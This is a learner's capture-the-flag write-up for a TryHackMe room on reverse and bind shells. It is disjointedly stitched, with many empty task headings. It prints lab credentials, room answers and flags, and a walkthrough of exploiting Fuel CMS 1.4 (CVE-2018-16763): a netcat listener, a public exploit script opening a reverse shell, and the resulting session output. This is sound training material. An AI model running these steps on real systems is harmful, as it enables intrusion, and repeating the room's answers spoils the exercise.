<h3> Welcome to the <em>TryHackMe ...</em></h3>
<h1>Jr Penetration Tester learning path > Privilege Escalation ></h1>
<h2>What the Shell?</h2>
<p>An introduction to sending and receiving (reverse/bind) shells when exploiting target machines.</p>
<br>
<p>October 28, 2024<br></p>
<br>

<div style="display: flex; justify-content: center; align-items: center;">
    <img src="https://github.com/user-attachments/assets/5d1db623-8135-49c1-ae8e-84d51143d515" width="150px" height="150px"/>
</div>
<br>

![image](https://github.com/user-attachments/assets/1fc95fc4-1200-46b9-a2f4-66f0de4c423e)


<p>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s key part of my 30-day-streak in <a href="https://www.wicys.org/benefits/security-training-scholarship/">WiCyS SANS Security Training</a> Stage 2 Program.<br><br>
Let´s get started!!<br><br>
Access this TryHackMe Room clicking <a href="https://tryhackme.com/r/room/introtoshells">What the Shell?</a>.<br>
<code>Note</code>: only subscribers can deploy Virtual Machines in this room.</p>

<h2>Task 1 - What the Shell?</h2>
<br>


> 1.1 - <em>Let's get hacking.</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

<h2>Task 2 - Exploit the Machine (Flag Submission)</h2>
<br>
<p>Before we can get into the intricacies of sending and receiving shells, it's important to understand what a shell actually is. In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.<br>

In simple terms, we can force the remote server to either send us command line access to the server (a <code>reverse</code> shell), or to open up a port on the server which we can connect to in order to execute further commands (a <code>bind</code> shell).<br>

We will be covering both of these scenarios in further detail throughout the room.<br>

The format of this room is as follows:</p>



<h2>Task 2 - Tools</h2>
<br>


<h2>Task 3 - Types of Tools</h2>
<br>

<h2>Task 4 - Netcat</h2>
<br>

<h2>Task 5 - Netcat Shell Stabilisation</h2>
<br>

<h2>Task 6 - Socat</h2>
<br>

<h2>Task 7 - Socat Encrypted Shells</h2>
<br>


<h2>Task 8 - Common Shell Payloads</h2>
<br>

<h2>Task 9 - msfvenom</h2>
<br>

<h2>Task 10 - Metasploit multi/handler</h2>
<br>

<h2>Task 11 - WebShells</h2>
<br>

<h2>Task 12 - Next Steps</h2>
<br>

<h2>Task 13 - Practice and Examples</h2>
<br>

<h2>Task 14 - Linux Practice Box</h2>
<br>

<h2>Task 15 - Windows Practice Box</h2>
<br>

<p>This task contains a Windows 2019 Server box running a XAMPP webserver. This can be used to practice shell uploads on Windows. Again, both Socat and Netcat are installed, so feel free to log in over RDP or WinRM to practice with these. The credentials are:</p>

<ul style="list-style-type:square">
    <li><code>Username</code>: Administrator</li>
    <li><code>Password</code>code>: TryH4ckM3!</li>
</ul></p>

<p>To login using RDP:</p>
<p><code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.205.224 /u:Administrator /p:'TryH4ckM3!'</code></p>

> 15.1 - <em>No answer required</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>
















<pre><code>$ example
</code></pre>
<br>

> 2.2 - <em>What is the name of the application running on the vulnerable machine?</em><br>
>> <code><strong>Fuel CMS</strong></code><br>
<p><br></p>

> 2.3 - <em>What is the version number of this application?</em><br>
>> <code><strong>1.4</strong></code><br>
<p><br></p>

![image](https://github.com/user-attachments/assets/436cc191-ab95-4f30-9520-10c2d019b1d2)

<br>

> 2.4 - <em>What is the number of the CVE that allows an attacker to remotely execute code on this application?</em><br>
> <code>Format</code>: CVE-XXXX-XXXXX
>> <code><strong>CVE-2018-16763</strong></code><br>
<p><br></p>

> 2.5 - <em>What is the value of the flag located on this vulnerable machine? This is located in <code>/home/ubuntu</code> on the vulnerable machine.</em>
>> <code><strong>THM{ACKME_BLOG_HACKED}</strong></code><br>
<p><br></p>

![image](https://github.com/user-attachments/assets/17fc5d2e-4c29-4755-85f1-63e700cefb3f)

<br>

![image](https://github.com/user-attachments/assets/113a9ee3-f4d4-42d9-8a36-000a88ca564e)

<br>

![image](https://github.com/user-attachments/assets/3b90d495-b60d-49d3-9e4d-916e04963e66)

<br>

![image](https://github.com/user-attachments/assets/16563e2d-546a-47ac-8ac2-937f08f6f6bb)

<br>

![image](https://github.com/user-attachments/assets/2d87ae8c-ba80-4e9a-ada0-bdf5ad637ea7)

<br>

![image](https://github.com/user-attachments/assets/aa1d57bc-7805-49e3-8226-5047dd515667)

<br>
<p>I did not continue using the file I downloaded from Exploit DB because it was presenting an error.</p>
<p>Proceeded copying the following:  <a href="https://gist.github.com/anir0y/8529960c18e212948b0e40ed1fb18d6d#file-fuel-cms-py">Vulnerability Capstone</a><br><br>
I set a listener.</p><br>

<pre><code>$ root@[Attack_IP]:~# nc -lvnp [Port]
</code></pre>
<br>

<p>Then I run the exploit with <code>python</code> against the <code>Target Machine</code>.</p>

<pre><code>$ python3 fuel-cms.py [Target_IP]
 ______         _ _____ ___  ___ _____ 
|  ___|        | /  __ \|  \/  |/  ___|
| |_ _   _  ___| | /  \/| .  . |\ `--. 
|  _| | | |/ _ \ | |    | |\/| | `--. \
| | | |_| |  __/ | \__/\| |  | |/\__/ /
\_|  \__,_|\___|_|\____/\_|  |_/\____/ 

Tested on 1.4                                       

Created by Ac1d

	Menu

exit     -	Exit app
shell_me -	Get a reverse shell (netcat) 
help     -	Show this help

fuelCMS$ shell_me
Enter your attacking machine IP:PORT $ [Attack_IP]:[Port]
   
</code></pre>
<br>

<p>After typing option <code>shell_me</code>, I got access to the <code>Target Machine</code>.</p>

<br>

<p>And I got access to the <code> Target Machine</code>.</p>

<pre><code>$ root@[Attack_IP]:~# nc -lvnp [Port]

Listening on [0.0.0.0] (family 0, port [Port])
Connection from [Target_IP] [Target_Port] received!
/bin/sh: 0: can't access tty; job control turned off
$ pwd
/var/www/html/fuelcms
$ whoami
www-data
$ cd /home/ubuntu
$ ls -la
total 40
drwxr-xr-x 5 ubuntu ubuntu 4096 Sep  3  2021 .
drwxr-xr-x 3 root   root   4096 Sep  3  2021 ..
-rw------- 1 ubuntu ubuntu  178 Sep  3  2021 .Xauthority
lrwxrwxrwx 1 ubuntu ubuntu    9 Sep  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 ubuntu ubuntu  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Feb 25  2020 .bashrc
drwx------ 2 ubuntu ubuntu 4096 Sep  3  2021 .cache
drwxrwxr-x 3 ubuntu ubuntu 4096 Sep  3  2021 .local
-rw-r--r-- 1 ubuntu ubuntu  807 Feb 25  2020 .profile
drwx------ 2 ubuntu ubuntu 4096 Sep  3  2021 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Sep  3  2021 .sudo_as_admin_successful
-rw-rw-r-- 1 ubuntu ubuntu   23 Sep  3  2021 flag.txt
$ cat flag.txt
THM{ACKME_BLOG_HACKED}
</code></pre>
<br>

<h2>Room Complete</h2>
<p>Keep learning, keep growing!<br>

![image](https://github.com/user-attachments/assets/80a2a3bc-f069-46cc-ace2-006c45bbd4a9)

<h2>My journey</h2>
<p></p>Following I share the status of my journey in TryHackMe.</p>

![image](https://github.com/user-attachments/assets/d1097bf7-819c-4529-a163-5c119e8bd770)

<p></p>

<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>

